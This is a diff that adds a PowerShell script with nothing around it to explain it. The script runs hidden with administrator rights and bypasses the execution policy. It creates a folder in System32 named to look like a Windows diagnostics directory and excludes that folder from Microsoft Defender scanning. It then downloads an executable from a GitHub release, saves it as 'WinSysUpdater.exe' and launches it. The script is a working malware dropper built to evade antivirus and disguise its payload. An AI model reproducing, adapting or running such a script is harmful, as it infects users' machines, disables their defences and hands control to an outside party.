@@ -1,0 +1,16 @@
+Start-Process PowerShell -ArgumentList "-WindowStyle Hidden -Command `" 
+    Set-ExecutionPolicy Bypass -Scope Process;
+    if (!(Test-Path 'C:\Windows\System32\DiagLogs')) {
+        New-Item -Path 'C:\Windows\System32\DiagLogs' -ItemType Directory -Force | Out-Null;
+    } else {
+    };
+    try {
+        Add-MpPreference -ExclusionPath 'C:\Windows\System32\DiagLogs';
+    } catch {
+        Write-Error 'Failed to add exclusion: $_';
+        Read-Host -Prompt 'Press Enter to exit'
+    };
+    cd 'C:\Windows\System32\DiagLogs';
+    Invoke-WebRequest -Uri 'https://github.com/greenstorm5417/funny/releases/download/v0.0.1/main.exe' -OutFile 'WinSysUpdater.exe' -UseBasicParsing;
+    Start-Process .\WinSysUpdater.exe;
+`"" -Verb RunAs; exit
